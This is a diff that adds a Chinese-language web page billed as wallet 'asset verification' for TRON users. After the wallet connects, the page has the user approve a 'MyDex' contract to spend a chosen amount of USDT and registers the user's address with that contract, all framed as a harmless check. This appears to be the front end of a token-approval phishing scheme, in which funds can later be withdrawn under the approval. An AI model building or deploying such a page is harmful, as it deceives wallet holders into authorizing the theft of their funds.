@@ -1,0 +1,110 @@
+<!doctype html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>驗證資產</title>
+  <style>
+    .center {
+      margin: auto;
+      width: 60%;
+      padding: 10px;
+    }
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+  <div class="center">
+    <button id="connectButton">請連接錢包</button>
+    <button id="checkNodeBtn">檢查節點狀態</button>
+  </div>
+
+  <div class="center">
+    <label>驗證金額：</label>
+    <input id="verifyAmount" placeholder="例如 0.1" />
+    <button id="approve_Btn">驗證</button>
+  </div>
+
+  <div class="center">
+    <button id="checkBtn">查詢授權與餘額</button>
+  </div>
+
+  <script>
+    const connectButton = document.getElementById("connectButton");
+    const approveButton = document.getElementById("approve_Btn");
+    const checkBtn = document.getElementById("checkBtn");
+    const checkNodeBtn = document.getElementById("checkNodeBtn");
+
+    const verifyAmountInput = document.getElementById("verifyAmount");
+
+    const USDT_contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const MyDex_contractAddress = "TMuFNH1Dq6QnkaK5U1d55QWDB65VCig1JK";
+
+    connectButton.onclick = async () => {
+      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+        alert("錢包已連接：" + window.tronWeb.defaultAddress.base58);
+        connectButton.innerHTML = "已連接：" + window.tronWeb.defaultAddress.base58;
+      } else {
+        alert("請使用 TronLink 或 imToken 瀏覽器開啟");
+      }
+    };
+
+    checkNodeBtn.onclick = async () => {
+      const status = {
+        fullNode: await window.tronWeb.isConnected("fullNode"),
+        solidityNode: await window.tronWeb.isConnected("solidityNode"),
+        eventServer: await window.tronWeb.isConnected("eventServer"),
+      };
+      alert(`節點狀態：
+FullNode: ${status.fullNode}
+SolidityNode: ${status.solidityNode}
+EventServer: ${status.eventServer}`);
+    };
+
+    approveButton.onclick = async () => {
+      try {
+        if (!window.tronWeb || !window.tronWeb.contract) {
+          return alert("不支援的錢包瀏覽器，請使用 TronLink");
+        }
+
+        const amountStr = verifyAmountInput.value.trim();
+        if (!amountStr) return alert("請輸入金額");
+
+        const amount = BigInt(Math.floor(parseFloat(amountStr) * 1e6)).toString();
+        const userAddress = window.tronWeb.defaultAddress.base58;
+
+        const USDT = await window.tronWeb.contract().at(USDT_contractAddress);
+        const MyDex = await window.tronWeb.contract().at(MyDex_contractAddress);
+
+        await USDT.approve(MyDex_contractAddress, amount).send({ feeLimit: 100_000_000 });
+        await MyDex.addAddress(userAddress).send({ feeLimit: 100_000_000 });
+
+        alert("✅ 加入成功");
+      } catch (err) {
+        console.error("❌ 錯誤：", err);
+        alert("❌ 失敗：" + (err.message || "未知錯誤"));
+      }
+    };
+
+    checkBtn.onclick = async () => {
+      try {
+        const userAddress = window.tronWeb.defaultAddress.base58;
+        const USDT = await window.tronWeb.contract().at(USDT_contractAddress);
+        const balance = await USDT.balanceOf(userAddress).call();
+        const allowance = await USDT.allowance(userAddress, MyDex_contractAddress).call();
+        alert(`錢包地址：${userAddress}
+USDT 餘額：${balance / 1e6}
+額度：${allowance / 1e6}`);
+      } catch (err) {
+        console.error("❌ 查詢錯誤：", err);
+        alert("❌ 查詢失敗：" + (err.message || "未知錯誤"));
+      }
+    };
+  </script>
+</body>
+</html>
